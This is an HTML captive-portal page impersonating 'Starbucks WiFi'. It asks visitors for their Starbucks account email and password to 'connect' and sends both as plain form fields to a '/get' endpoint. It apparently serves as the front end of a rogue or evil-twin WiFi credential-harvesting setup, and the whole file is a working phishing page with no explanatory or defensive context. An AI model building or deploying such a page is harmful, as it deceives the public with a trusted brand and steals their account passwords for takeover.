<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#1E3932;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.logo{width:68px;height:68px;border-radius:50%;background:#00704A;border:3px solid #CBA258;display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
.logo svg{width:40px;height:40px;fill:#fff}
.brand{font-size:14px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:#CBA258;text-align:center;margin-bottom:26px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.35)}
.ch{background:#00704A;padding:20px 24px;text-align:center}
.ch h1{font-size:17px;font-weight:700;color:#fff}.ch p{font-size:12px;color:rgba(255,255,255,0.7);margin-top:3px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#00704A;box-shadow:0 0 0 3px rgba(0,112,74,0.12)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;text-align:center;margin-top:16px;line-height:1.5}.terms a{color:#00704A}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#00704A;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg></div>
<div class="brand">Starbucks WiFi</div>
<div class="card">
  <div class="ch"><h1>Welcome to Starbucks</h1><p>Sign in to enjoy free WiFi</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">Starbucks Account Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>.</p>
    </form>
  </div>
</div>
</body>
</html>
